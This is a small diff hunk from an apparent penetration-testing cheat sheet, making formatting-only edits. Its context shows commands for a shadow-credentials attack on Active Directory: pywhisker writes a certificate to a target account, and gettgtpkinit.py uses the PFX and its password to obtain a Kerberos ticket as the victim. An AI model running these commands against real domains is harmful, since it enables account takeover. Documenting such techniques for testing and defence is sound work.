@@ -5871,9 +5871,9 @@ pywhisker --dc-ip <DC01_IP> -d <CORP.LOCAL> -u wwhite -p '<PASSWORD>' --target <
 # [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
 ```
 
-In the output above, we can see that a PFX (PKCS12) file was created (eFUVVTPf.pfx), and the password is shown.
+In the output above, we can see that a PFX (PKCS12) file was created (`eFUVVTPf.pfx`), and the password is shown.
 
-**Use this file with gettgtpkinit.py to acquire a TGT as the victim**
+**Use this file with `gettgtpkinit.py` to acquire a TGT as the victim**
 
 ```bash
 python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip <DC01_IP> CORP.LOCAL/<USER> /tmp/<USER>.ccache
